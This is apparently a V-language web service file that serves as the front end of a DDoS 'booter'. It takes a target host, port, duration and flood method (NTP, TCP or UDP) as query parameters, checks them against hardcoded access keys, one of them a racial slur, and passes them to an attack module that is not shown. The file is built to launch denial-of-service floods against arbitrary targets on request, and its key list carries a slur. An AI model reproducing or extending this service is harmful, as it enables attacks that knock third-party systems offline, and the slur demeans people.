import vweb
import json
import attack
import os

struct App {
	vweb.Context
}

const (
	key = ["nigga", "memeq"]
	bl_host = ["1.1.1.1", "2.2.2.2", "3.3.3.3", "4.4.4.4", "5.5.5.5", "6.6.6.6", "7.7.7.7", "8.8.8.8", "9.9.9.9", "127.0.0.1"]
	method_list = ["NTP", "TCP", "UDP"]
)

fn (mut app App) index() vweb.Result {
	return $vweb.html()
}

fn (mut app App) api() vweb.Result {

	username := app.query["user"]
	host := app.query["host"]
	port := app.query["port"]
        times := app.query["times"]
	method := app.query["method"]

	// handle empty parameter
	if username in key {} 
	else {return app.text(json.encode({"error": "Invalid Username!"}))}
	if username == "" { return app.text(json.encode({"error": "Please fill the username!"})) }
	else if host == "" { return app.text(json.encode({"error": "Please fill the host!"})) }
	else if port == "" { return app.text(json.encode({"error": "Please fill the port!"})) }
	else if times == "" { return app.text(json.encode({"error": "Please fill the times!"})) }
	else if method == "" { return app.text(json.encode({"error": "Please fill the method!"})) }
	if host in bl_host{return app.text(json.encode({"error": "$host is blacklisted host!"}))}
	if method in method_list {}
	else {return app.text(json.encode({"error": "Invalid method attack!"}))}
	json_data := {
		'host': '$host',
		'port': '$port',
		'times': '$times',
		'method': '$method'
	}
	attack.send_attack(username, host, port, times, method)
	output := json.encode(json_data)
	return app.text(output)
}

fn main() {
	mut port := os.args[1] or {
		panic("Failed to run vAPI!")
	}
	vweb.run(&App{}, port.int())
}
